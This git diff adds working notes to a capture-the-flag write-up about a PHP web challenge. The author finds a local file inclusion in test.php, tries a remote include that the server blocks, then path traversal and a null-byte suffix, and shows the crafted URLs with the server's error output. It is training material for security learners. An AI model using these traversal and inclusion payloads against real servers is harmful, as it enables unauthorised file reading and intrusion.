@@ -73,6 +73,94 @@ No results from Gobuster 2.3-small.txt and 2.3-medium.txt
 Visiting /index.php brings up the same page:
 
 http://challenges.laptophackingcoffee.org:666/index.php
-
-
 https://pentesterlab.com/exercises/php_include_and_post_exploitation/course
+
+Per nikto's suggestion, visit /test.php:
+
+http://challenges.laptophackingcoffee.org:666/test.php
+```
+Notice: Undefined index: key in /var/www/html/test.php on line 2
+
+Notice: Undefined index: page in /var/www/html/test.php on line 3
+
+Warning: include(.php): failed to open stream: No such file or directory in /var/www/html/test.php on line 6
+
+Warning: include(): Failed opening '.php' for inclusion (include_path='.:/usr/share/php') in /var/www/html/test.php on line 6
+```
+
+Look a little closer at the errors:
+```
+Notice: Undefined index: key in /var/www/html/test.php on line 2
+```
+
+What if a key variable is sent?
+```
+http://challenges.laptophackingcoffee.org:666/test.php?key=1
+```
+
+Website results:
+```
+Notice: Undefined index: page in /var/www/html/test.php on line 3
+
+Warning: include(.php): failed to open stream: No such file or directory in /var/www/html/test.php on line 6
+
+Warning: include(): Failed opening '.php' for inclusion (include_path='.:/usr/share/php') in /var/www/html/test.php on line 6
+```
+
+Now send a `page` variable:
+
+http://challenges.laptophackingcoffee.org:666/test.php?key=1&page=2
+
+web results:
+```
+Warning: include(2.php): failed to open stream: No such file or directory in /var/www/html/test.php on line 6
+
+Warning: include(): Failed opening '2.php' for inclusion (include_path='.:/usr/share/php') in /var/www/html/test.php on line 6
+```
+
+Try using page = "index"
+http://challenges.laptophackingcoffee.org:666/test.php?key=0&page=index
+
+results:
+```
+Here I'm going to post the passwords for all of the LHC users. NOTE: I'm using this server as backup storage while reinstalling everything on my home machine. DO NOT DELETE FILES!
+```
+
+The page loads index.php.
+
+Try sending its own index.php page:
+
+http://challenges.laptophackingcoffee.org:666/test.php?key=0&page=http://challenges.laptophackingcoffee.org:666/index
+
+```
+Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in /var/www/html/test.php on line 6
+
+Warning: include(http://challenges.laptophackingcoffee.org:666/index.php): failed to open stream: no suitable wrapper could be found in /var/www/html/test.php on line 6
+
+Warning: include(): Failed opening 'http://challenges.laptophackingcoffee.org:666/index.php' for inclusion (include_path='.:/usr/share/php') in /var/www/html/test.php on line 6
+```
+http wrapper disabled.
+
+http://challenges.laptophackingcoffee.org:666/test.php?key=0&page=../html/index
+
+http://challenges.laptophackingcoffee.org:666/test.php?key=0&page=../../www/html/index
+
+http://challenges.laptophackingcoffee.org:666/test.php?key=0&page=../../../var/www/html/index
+
+```
+Here I'm going to post the passwords for all of the LHC users. NOTE: I'm using this server as backup storage while reinstalling everything on my home machine. DO NOT DELETE FILES!
+```
+
+Add a null-byte at end of param
+
+http://challenges.laptophackingcoffee.org:666/test.php?key=1&page=./index.php%00?
+
+different error:
+```
+Warning: include(): Failed opening './index.php' for inclusion (include_path='.:/usr/share/php') in /var/www/html/test.php on line 6
+```
+
+* http://users.atw.hu/webexploit/0006.html
+* https://security.stackexchange.com/questions/181704/exploit-lfi-bug-when-a-inc-php-is-appended-to-the-file-name
+* https://hakin9.org/web-application-penetration-testing-local-file-inclusion-lfi-testing/
+* https://highon.coffee/blog/lfi-cheat-sheet/
